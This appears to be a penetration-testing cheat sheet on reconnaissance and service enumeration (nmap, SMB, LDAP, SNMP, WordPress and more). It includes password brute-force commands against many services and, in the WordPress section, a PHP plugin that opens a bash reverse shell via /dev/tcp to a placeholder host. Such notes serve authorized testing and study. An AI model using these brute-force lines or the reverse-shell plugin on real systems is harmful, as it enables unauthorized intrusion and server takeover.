# 🔍 Information Gathering

## Passive

- **Whois**: `whois <domain/ip> -h <whois_server>`
- **Google dorks**: `site:` , `filetype:`,  `intitle:`, [DorkSearch](https://dorksearch.com/) or [GHDB](https://www.exploit-db.com/google-hacking-database)
- [**Netcraft**](https://searchdns.netcraft.com/): DNS analyzer
- **Open-Source code**:
  - `path:<word>` inside a Github repo to search files with that word.
  - Tools: [Gitrob](https://github.com/michenriksen/gitrob), [Gitlkeaks](https://github.com/zricethezav/gitleaks)
- [**Shodan**](https://shodan.io): `hostname:<name>`
- **Security headers**: [Security Headers](https://securityheaders.com/), [SSL Server Test](https://www.ssllabs.com/ssltest/)

## Active

### Host Discovery

```shell
for i in {1..254} ;do (ping -c 1 x.x.x.$i \| grep "bytes from" &) ;done # Linux
for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 \| find "Reply" # Windows
1..254 \| % {"x.x.x.$($_): $(Test-Connection -count 1 -comp x.x.x.$($_) -quiet)"} # PowerShell

nmap -v -sn x.x.x.1-253
nmap -sn x.x.x.0/24

fping -asgq <IP>/<segment>
```

### Port Scanning

```shell
# netcat scan
nc -nvv -w 1 -z <ip> 3388-3390 # tcp
nc -nv -u -z -w 1 <ip> 120-123 # udp

# nmap
nmap <ip> # -sS SYN by default
nmap -sT <ip> # TCP scan
sudo nmap -sU <ip> # UDP scan, sudo needed to access raw sockets
nmap -sT -A --top-ports=20 x.x.x.1-253 -oN sweep.txt
nmap -A -Pn -T4 --min-rate 5000 -p- <ip> # Full scan skipping host discovery
nmap -sC -sV -Pn -n -T4 --min-rate 5000 -p- <ip> -oN nmap # Scan with version discovery and scripts without name resolution

# tcp scan with proxychains
sudo proxychains -q nmap -sT -Pn --top-ports 200 <ip>

# Powershell
Test-NetConnection -Port <port> <ip> 

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null # Powershell one-liner to scan the first 1024 ports
```

#### NSE

```shell
sudo nmap --script-updatedb
locate .nse | grep <name>
locate .nse | xargs grep categories
nmap --script-help <name>
nmap --script <name> -p <port> <ip>
# example
nmap -sV -p 445 --script smb-ls <ip> 
```

#### Unknown Service

```shell
# when a port is unrecognized try
telnet <ip> <port>
nc -v <ip> <port>
curl -v http://<target>:<port>

# the machine name can provide a clue about the unknown service, try searching for the port and the name 
```

### Packet Capture

```shell
# capture packets going to port 80
tshark -i tun0 -Y "ip.addr == <local_ip> && tcpdstport == 80" 2>/dev/null
```

### FTP - 21

!!! tip
    🍪 Try **anonymous:anonymous**

```shell
ftp <ip>
# once inside upload/download files with
put <file>
get <file>

# burteforce
hydra ftp://<ip> -l <user> -P <wordlist>
patator ftp_login host=<ip> user=FILE0 password=FILE1 0=<userlist> 1=<wordlist> -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500

# nse
locate .nse | grep ftp
nmap -p 21 --script=<name> <ip>
```

### SSH - 22

```shell
ssh username@<ip>

# using private key
ssh username@<ip> -i <key>

# bruteforce
hydra ssh://<ip> -l <user> -P <wordlist> -s <port>
patator ssh_login host=<ip> user=<user> password=FILE0 0=<wordlist> -x ignore:mesg='Authentication failed.'
```

### SMTP - 25

```shell
# banner grabbing
telnet <ip> 25

nc -nv <ip> 25
VRFY <user>
RPC TO:<user>
EXPN <user>

# check if user exists
smtp-user-enum -M <MODE> -D <domain> -u <user> -t <IP>
nmap --script smtp-enum-users <ip>

# Windows
Test-NetConnection -Port 25 <IP> # Non-interactive
dism /online /Enable-Feature /FeatureName:TelnetClient # Needs privs
telnet <IP> 25 # Needs telnet.exe binary
```

### DNS - 53  

Common type of DNS records:

- **NS (Nameserver)**: Points to the authoritative DNS servers for a domain.
- **A (Address)**: Maps a hostname (e.g., `www.example.com`) to an IPv4 address.
- **AAAA (Quad A)**: Maps a hostname to an IPv6 address.
- **MX (Mail Exchange)**: Specifies mail servers for email handling. Multiple records allowed.
- **PTR (Pointer)**: Used for reverse DNS lookups; maps IP addresses to hostnames.
- **CNAME (Canonical Name)**: Creates an alias for another hostname.
- **TXT (Text)**: Stores arbitrary text data, often for verification (e.g., domain ownership).

!!! tip
    📜 Recommended wordlists: `/usr/share/seclists/Discovery/DNS`

```shell
host megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com
host sub.megacorpone.com

# subdomain bruteforce
for word in $(cat list.txt); do host $word.megacorpone.com; done
# reverse IP bruteforce
for word in $(seq 200 254); do host 192.168.50.$word; done | grep -v "not found"

# dnsrecon
dnsrecon -d megacorpone.com -t std
dnsrecon -d megacorpone.com -D list.txt -t brt # bruteforce

# dnsenum 
dnsenum megacorpone.com

# nslookup (Linux/Windows)
nslookup megacorpone.com
# query a specific server
nslookup -type=TXT info.megacorptwo.com <ip>

# Zone transfer
dig @<ip> <domain> axfr 
```

### HTTP - 80, 443 (TLS)

- Technology stack identification with [Wappalyzer](https://www.wappalyzer.com/) , Nmap or whatweb.
- Check **robots**, sitemap, 404 and SSL/TLS scan.
- Directory brute forcing.
- Inspect source code.
- If the web uses a domain, add it to hosts file.
- Check if the host has services like FTP/SMB with write perms and check if a file can be accessed from the web.

!!! tip
    📜 Recommended wordlists: `/usr/share/seclists/Discovery/Web-Content`

> [git-dumper](https://github.com/arthaud/git-dumper)

```shell
# analyze website
whatweb -a 1 <url>
nikto -h <url>
sslscan <host>:<port>

# brute force directories
gobuster dir -u <url> -w <wordlist> -t 60 -x pdf,txt,php,config,git
wfuzz -w <wordlist> <URL>/FUZZ
feroxbuster -u <url> -w <wordlist> -t 60 -x pdf -x txt -x php -x config -x git

# brute force login page with hydra and patator
hydra -L <userlist> -P <wordlist> <target> http-{get|post}-form "/login:username=^USER^&password=^PASS^:F=Login failed. Invalid"
patator http_fuzz url=<url> method=POST body='user=admin&pass=COMBO00&sublogin=1' 0=<wordlist> accept_cookie=1 follow=1 max_follow=2 -x ignore:fgrep='Invalid password' -x ignore:clen=5881

# if .git found, dump it
git-dumper <url>/.git ./website
```

#### Wordpress

!!! info
    🐈‍⬛ Hashcat mode -> 400

```shell
wpscan --url <url>
# enumerate vulnerable plugins, users, vulnerable themes and timthumbs and save it to file
wpscan --url <url> -e vp,u,vt,tt -o result.log
# scan popular plugins aggresively and get vulns
wpscan --url <url> -e p --api-token <API_TOKEN> --plugins-detection aggressive
# brute force found users, use -U admin for a single user
wpscan --rua -e u --url <url> -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt 
```

If admin permissions are granted, upload a plugin with a reverse shell.

```shell
cat rs/rs.php
<?php
/*
Plugin Name: Reverse Shell
Plugin URI: http://your-site.com/
Description: A simple plugin to establish a reverse shell using /bin/sh.
Version: 1.0
Author: Pentester
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'") ?>

zip -r rs.zip rs
```

### POP3 - 110, 995 (TLS)

```shell
telnet <ip> <port>

# commands
USER uid           Log in as "uid"
PASS password      Substitue "password" for your actual password
STAT               List number of messages, total mailbox size
LIST               List messages and sizes
RETR n             Show message n
DELE n             Mark message n for deletion
RSET               Undo any changes
QUIT               Logout (expunges messages if no RSET)
TOP msg n          Show first n lines of message number msg
CAPA               Get capabilities
```

### NFS - 111, 2049

```shell
# list mounts
showmount -e <ip>

nfs_analyze <ip>

# mount a share
mkdir nfsfolder
sudo mount -t nfs <ip>:/export/data nfsfolder
```

### SMB - 139, 445

```shell
# details about devices using netbios
sudo nbtscan -r <ip>/<range>

# nse
locate .nse | grep smb
nmap --script=<name> <ip>

# enum shares from windows
net view \\<host/IP> /all

# smbclient
smbclient -U '<domain>/<user>%<pass>' -L //<ip>
smbclient -U '' -L //<ip> # list shares anonymously
smbclient -U '' -N -L //<ip> # list by null session
smbclient -U '' //<ip>/share # access share
smbclient -U '<domain>/<user>%<pass>' -L //<ip>

# once inside, upload or download files
get <file>
put <file>
# or get entire folder
prompt OFF
recurse ON
mget *
# one-liner
smbclient -U 'guest' //<ip>/<share> -c 'prompt OFF;recurse ON; mget *'

# smbmap (shows permissions)
smbmap -H <ip> -u <user> -p <pass>
smbmap -H <ip> -u <user> -p <pass> -d <domain>
smbmap -H <ip> -u <user> -p <pass> -r <share>

# nxc
nxc smb <ip> -u <user> -p <pass>
nxc smb <ip> -u <user> -p <pass> -d <domain> --shares
nxc smb <ip> -u <user> -p <pass> -d <domain> --users
nxc smb <ip> -u <user> -p <pass> -d <domain> --all
# enum users by rid
nxc smb <ip> -u 'guest' -p '' --rid-brute

# auto
enum4linux -a <ip>
```

### RPC - 139, 445

```shell
rpcclient -U "" -N <IP> # null session
rpcclient -U "" <IP> # anon session
rpcclient -U "guest&" <IP> # public session
rpcclient //machine.htb -U domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pw-nt-hash
rpcclient -U "username%passwd" <IP>

# once inside
enumdomusers
enumdomgroups
enumprivs
queryuser <user>
querygroup <group>
querydispinfo
```

### IMAP - 143, 993 (TLS)

> [Commands examples](https://donsutherland.org/crib/imap)

```shell
# brute force
hydra imap://<ip> -L <userlist> -P <wordlist>
nmap -sV --script imap-brute -p <port> <ip>

# connect to server
telnet <ip> <port>
```

### SNMP - 161/udp

```shell
# nmap UDP scan
sudo nmap -sU --open -p 161 <IP>

snmpwalk -c public -v1 -t 10 <IP> # Entire MIB tree
snmpwalk -c public -v1 <IP> <MIB value>

snmpcheck -t <IP> -c public

# Windows MIB values
1.3.6.1.2.1.25.1.6.0   - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25  - User Accounts
1.3.6.1.2.1.6.13.1.3   - TCP Local Ports

# enumerate even more
apt-get install snmp-mibs-downloader
sudo download-mibs
snmpwalk -c public -v1 -t 10 <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# brute force community word with https://github.com/SECFORCE/SNMP-Brute/blob/master/snmpbrute.py
python snmpbrute.py -t <ip> -f /usr/share/seclists/Discovery/SNMP/snmp.txt
hydra snmp://192.168.188.149 -P /usr/share/seclists/Discovery/SNMP/snmp.txt
```

### LDAP - 389, 636 (TSL)

> [Windapsearch](https://github.com/ropnop/windapsearch)

```shell
# get users info
ldapsearch -x -H ldap://<ip>:<port> 

# find all users
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=user)"
# find a specific user by username
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(sAMAccountName=<name>)"
# find all groups
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=group)"
# find groups a specific user belongs to
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(&(objectClass=group)(member=CN=John Doe,CN=Users,DC=<domain>,DC=<tld>))"
# find all computer objects
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(objectClass=computer)"
# find all domain controllers
ldapsearch -x -H ldap://<ip> -D "<domain>\<user>" -W -b "DC=<domain>,DC=<tld>" "(userAccountControl:1.2.840.113556.1.4.803:=532480)"

# windapsearch.py
# get all users
python3 windapsearch.py --dc-ip <ip> -u <username> -p <password> -U
# get all domain admin members
python3 windapsearch.py --dc-ip <ip> -u <username> -p <password> --da
# get groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> -G
# get computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> -C
# get privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> -PU
```

### MSSQL - 1433

!!! tip
    🍪 Don't forget the `-windows-auth` param

```shell
# sql auth
impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
# NTLM or Kerberos auth
impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -windows-auth

# bruteforce
hydra mssql://<ip> -L <userlist> -P <wordlist>
patator mssql_login host=<ip> user=sa password=FILE0 0=<wordlist> -x ignore:fgrep='Login failed for user'

# run commands
enable_xp_cmdshell
```

### RDP - 3389

```shell
nxc rdp <ip> -u <user> -p <pass>

# bruteforce
hydra rdp://<ip> -L <userlist> -P <wordlist>
patator rdp_login host=<ip> user='administrator' password=FILE0 0=<wordlist>
```

#### RPC RID Cycling Attack

If we can connect but have no permissions to enum, maybe we can enum by RID Cycling.

```shell
# first, enum administrator
> rpcclient -U "guest%" <ip> -c 'lookupnames administrator'
administrator S-1-5-21......-500
# the rid is 500, so we can lookupsids increasing the rid
> rpcclient -U "guest%" <ip> -c 'lookupsids S-1-5-21......-501'
> rpcclient -U "guest%" <ip> -c 'lookupsids S-1-5-21......-502'
# this can be automated 
seq 400 2000 | xargs -P 50 -I {} rpcclient -U "guest%" <ip> -c 'lookupsids S-1-5-21......-{}'
```

### WinRM - 5985, 5986 (TLS)

```shell
nxc winrm <ip> -d <domain> -u userlist -p passwordlist
nxc winrm <ip> -d <domain> -u userlist -p passwordlist -x "whoami"

# if the user belongs to the remote management group or has admin privileges
evil-winrm -i <ip>/<domain> -u <user> -p <pass>
evil-winrm -i <ip>/<domain> -u <user> -H <hash> 
```

## Redis - 6379

!!! tip
    🍪 [Rogue server](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#interactive-shell) could work for some instances >= 5.0.5 too!

```shell
nmap --script redis-info -sV -p 6379 <ip>

redis-cli -h <ip>
# commands
info
client list
config get *
keys *
```
